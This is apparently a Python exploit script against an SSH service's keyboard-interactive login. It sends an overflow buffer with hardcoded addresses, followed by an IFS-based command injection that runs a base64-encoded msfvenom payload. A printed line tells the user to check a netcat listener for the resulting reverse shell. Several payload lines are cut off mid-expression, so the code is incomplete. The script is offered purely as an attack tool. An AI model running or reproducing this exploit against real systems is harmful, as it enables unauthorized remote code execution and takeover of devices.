
import socket
import paramiko
from time import sleep

# Correct the payload (replace with your own shellcode as needed)
payload = b"A" * 516 + b"\x04\x39\xbb\xfe" + b"\x19\xf8\xf0\x14" + b"\x01\x01\x04\x08" +>
payload += b"python${IFS}-c${IFS}\""

# msfvenom payload
payload += b"exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8'>
payload += b"\""

# Print payload length for verification
print(f"Payload length => {len(payload)}")

# Interactive handler function
def inter_handler(title, instructions, prompt_list):
    resp = []  # Initialize the response container
    for pr in prompt_list:
        print(pr)
        if pr[0].startswith('Please enter user name:'):
            sleep(10)
            resp.append(payload)
            print("Payload sent, check your netcat listener")
    return tuple(resp)

# Exploit function
def run_exploit(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, 22))  # Connect to the SSH port
        ts = paramiko.Transport(sock)
        ts.start_client(timeout=10)

        # You can set a valid username here
        ts.auth_interactive(username="admin", handler=inter_handler)
    except Exception as e:
        print(f"Failed to exploit {ip}: {e}")

# Single IP address to exploit (from your request)
target_ip = 'ip addresss'

print(f"Running exploit on {target_ip}")
run_exploit(target_ip)


